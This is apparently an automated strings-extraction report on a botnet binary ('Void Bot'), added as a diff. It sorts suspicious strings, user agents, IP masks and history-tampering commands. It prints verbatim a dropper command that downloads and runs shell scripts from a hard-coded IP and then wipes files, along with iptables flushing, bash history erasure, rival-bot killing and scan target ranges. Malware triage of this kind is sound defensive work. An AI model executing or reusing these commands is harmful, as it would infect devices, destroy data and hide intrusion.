@@ -1,0 +1,544 @@
+=============================================================================
+========	BINARY ID :f05bfce56a70b830497e0d246c11c3eaa4c40595==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :3726
+SUPSCPECTED LINES COUNT :232
+SUPSCPECTED STRINGS COUNT (DISTINCT) :27
+SUPSCPECTED STRINGS WEIGHT :104
+SUSPECT STRING SCORE : [104 / 150] 69%
+USER AGENTS STRINGS COUNT :62
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :199
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+nopqrstuvwß
+\a__netf2
+__netf2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
+/bin/sh
+/proc/cpuinfo
+PING
+gethostbyname
+\e[0;31mSuccessfully Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
+l%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
+bin*
+bot*
+busybotnet*
+busybotnet
+/dev/netslink/
+/usr/
+>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
+pkill -9 %s\r\n
+rm -rf /bin/netstat
+pkill -9 busybox
+pkill -9 perl
+/sbin/iptables -F;/sbin/iptables -X
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+http
+Failed opening raw socket.
+Invalid flag "%s"
+GETLOCALIP
+BOTKILL
+Killing Bots
+LOOPING PAYLOAD
+TELNET
+TELNET ON | OFF
+NETIS
+[NETIS] SCANNER Starting
+HTTP
+/proc/net/route
+/usr/bin/python
+/usr/sbin/dropbear
+\e[1;36m Void Bot Connected \e[1;31m| \e[1;37mIP: \e[1;35m%s \e[1;31m| \e[1;37mType: \e[1;35m%s \e[1;31m| \e[1;37mVersion: \e[1;35m%s
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+;<=>?@ABCDEFGJIMOPQRSTUVWX[\\^_`abcxyz{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Unknown host
+Host name lookup failure
+/proc/stat
+/proc/cpuinfo
+processor
+/sys/devices/system/cpu
+/bin/sh
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b
+fdopen_pids
+LOCALSZ
+libc/sysdeps/linux/mips/vfork.S
+getpid.c
+fork.c
+waitpid.c
+kill.c
+sigprocmask.c
+spec_flags.4692
+strstr.c
+_string_syserrmsgs.c
+error_msg
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname2.c
+hoste.5323
+connect.c
+socket.c
+__malloc_largebin_index
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+nprocessors_onln
+system.c
+inet_aton.c
+gethostbyname2_r.c
+inet_pton4
+inet_ntop4
+dnslookup.c
+get_hosts_byname_r.c
+gethostbyname_r.c
+gethostname.c
+read_etc_hosts_r.c
+__res_sync
+__open_etc_hosts
+__GI_inet_ntoa_r
+__GI_sigprocmask
+__GI_kill
+__local_nameserver
+__GI_fork
+__GI_getpid
+__GI_socket
+__GI_connect
+__read_etc_hosts_r
+waitpid
+random
+connect
+numpids
+initConnection
+inet_pton
+sendTCP
+__GI_random_r
+getpid
+getHost
+makeRandomStr
+sendHTTP
+system
+__dns_lookup
+random_r
+gethostbyname_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+srandom_r
+hostname_to_ip
+__GI_srandom_r
+Server_Botport
+kill
+inet_addr
+__GI_gethostname
+connectTimeout
+gethostbyname2_r
+ngPid
+strstr
+init_rand
+rand
+__netf2
+StartTheNetis
+HackerScan2
+__GI_gethostbyname_r
+__GI_inet_ntop
+fork
+__GI_gethostbyname
+__GI_random
+inet_aton
+processCmd
+get_telstate_host
+listFork
+srand
+sendUDP
+inet_ntoa
+__libc_system
+__get_hosts_byname_r
+botkiller
+HackerScan
+__GI_inet_pton
+gethostbyname
+__vfork
+gethostname
+__libc_waitpid
+socket_connect
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_gethostbyname2
+__GI_strstr
+inet_ntop
+gethostbyname2
+__GI_inet_aton
+hekkertelnet
+__GI_vfork
+NetisRanges
+__GI_gethostbyname2_r
+__GI_inet_addr
+__libc_connect
+pids
+sigprocmask
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
+Opera/6.04 (Windows XP; U) [en]
+Opera/9.99 (X11; U; sk)
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
+Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
+Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
+Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
+Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
+Mozilla/5.0 (PLAYSTATION 3; 3.55)
+Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
+wii libnup/1.0
+Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
+PSP (PlayStation Portable); 2.00
+Bunjalloo/0.7.6(Nintendo DS;U;en)
+Doris/1.15 [en] (Symbian)
+BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
+Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
+Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
+Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+191.96.249.102
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+112.5.%d.%d
+117.165.%d.%d
+85.3.%d.%d
+37.158.%d.%d
+95.9.%d.%d
+41.252.%d.%d
+58.71.%d.%d
+104.55.%d.%d
+78.186.%d.%d
+78.189.%d.%d
+221.120.%d.%d
+88.5.%d.%d
+41.254.%d.%d
+103.20.%d.%d
+103.47.%d.%d
+103.57.%d.%d
+45.117.%d.%d
+101.51.%d.%d
+137.59.%d.%d
+1.56.%d.%d
+1.188.%d.%d
+14.204.%d.%d
+27.0.%d.%d
+27.8.%d.%d
+27.50.%d.%d
+27.54.%d.%d
+27.98.%d.%d
+27.112.%d.%d
+27.192.%d.%d
+36.32.%d.%d
+36.248.%d.%d
+39.64.%d.%d
+42.4.%d.%d
+42.48.%d.%d
+42.52.%d.%d
+42.56.%d.%d
+42.63.%d.%d
+42.84.%d.%d
+42.176.%d.%d
+42.224.%d.%d
+43.253.%d.%d
+43.230.%d.%d
+163.53.%d.%d
+62.252.%d.%d
+43.245.%d.%d
+62.255.%d.%d
+123.25.%d.%d
+103.54.%d.%d
+27.255.%d.%d
+103.204.%d.%d
+123.24.%d.%d
+113.191.%d.%d
+81.100.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+94.174.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+45.121.%d.%d
+45.120.%d.%d
+45.115.%d.%d
+43.252.%d.%d
+43.240.%d.%d
+41.174.%d.%d
+49.118.%d.%d
+78.188.%d.%d
+45.127.%d.%d
+103.30.%d.%d
+14.33.%d.%d
+123.16.%d.%d
+202.44.%d.%d
+116.93.%d.%d
+91.83.%d.%d
+41.253.%d.%d
+117.173.%d.%d
+113.190.%d.%d
+146.88.%d.%d
+112.196.%d.%d
+113.178.%d.%d
+112.45.%d.%d
+183.223.%d.%d
+116.71.%d.%d
+103.44.%d.%d
+110.235.%d.%d
+124.253.%d.%d
+211.237.%d.%d
+117.175.%d.%d
+178.93.%d.%d
+111.9.%d.%d
+222.252.%d.%d
+113.174.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+113.167.%d.%d
+113.168.%d.%d
+113.169.%d.%d
+123.17.%d.%d
+123.18.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.255.%d.%d
+37.247.%d.%d
+41.208.%d.%d
+183.220.%d.%d
+175.201.%d.%d
+103.198.%d.%d
+50.205.%d.%d
+88.248.%d.%d
+88.105.%d.%d
+88.247.%d.%d
+85.105.%d.%d
+188.3.%d.%d
+103.203.%d.%d
+103.55.%d.%d
+103.220.%d.%d
+183.233.%d.%d
+103.242.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.60.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.35.%d.%d
+103.49.%d.%d
+103.62.%d.%d
+144.48.%d.%d
+163.47.%d.%d
+223.29.%d.%d
+59.153.%d.%d
+113.176.%d.%d
+113.175.%d.%d
+113.177.%d.%d
+113.183.%d.%d
+202.164.%d.%d
+203.134.%d.%d
+210.56.%d.%d
+49.156.%d.%d
+203.210.%d.%d
+117.181.%d.%d
+117.178.%d.%d
+117.177.%d.%d
+117.176.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.162.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+203.150.%d.%d
+50.233.%d.%d
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+/proc/stat
+/proc/cpuinfo
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+history -c;history -w
+history -c
+rm -rf ~/.bash_history
+history -w
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
+l%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n x00
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \r\n
